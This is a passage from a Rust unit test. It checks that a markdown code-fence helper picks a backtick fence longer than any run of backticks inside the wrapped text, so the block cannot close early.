            "`".repeat(4),
            "`".repeat(9)
        );
        let block = raw_markdown_block(&nasty);
        let fence = "`".repeat(10);
        assert!(block.starts_with(&format!("{fence}markdown\n")), "{block}");
        assert!(block.ends_with(&format!("\n{fence}")), "{block}");
        // 正文里最长的一串是 9 个，比围栏短，所以不会提前关闭。
        let inner = &block[fence.len()..block.len() - fence.len()];
        assert!(!inner.contains(&fence));
    }
}
